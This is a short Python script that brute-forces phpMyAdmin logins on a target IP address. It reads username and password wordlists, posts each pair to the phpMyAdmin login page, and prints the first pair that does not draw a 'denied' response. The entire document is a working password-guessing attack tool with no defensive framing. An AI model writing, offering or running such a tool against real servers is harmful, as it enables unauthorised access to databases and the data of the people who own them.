import requests, argparse

parser  = argparse.ArgumentParser()
parser.add_argument('target_ip')
parser.add_argument('-pw', '--passwords_file')
parser.add_argument('-us', '--users_file')
args    = parser.parse_args()

if (args.users_file == None): args.users_file = 'usernames.txt'
if (args.passwords_file == None): args.passwords_file = 'passwords.txt'

users       = []
passwords   = []

with open(args.users_file, 'r') as users_file:
    users       = users_file.read().splitlines()

with open(args.passwords_file, 'r') as passwords_file:
    passwords   = passwords_file.read().splitlines()

url = 'http://' + args.target_ip + '/phpMyAdmin/index.php'

found   = False

for user in users:
    for password in passwords:
        data = {
            'pma_username': user,
            'pma_password': password,
        }

        login = requests.post(url, data=data)
        if ('denied' not in login.text):
            print(user, password)
            found   = True
            break

    if (found): break
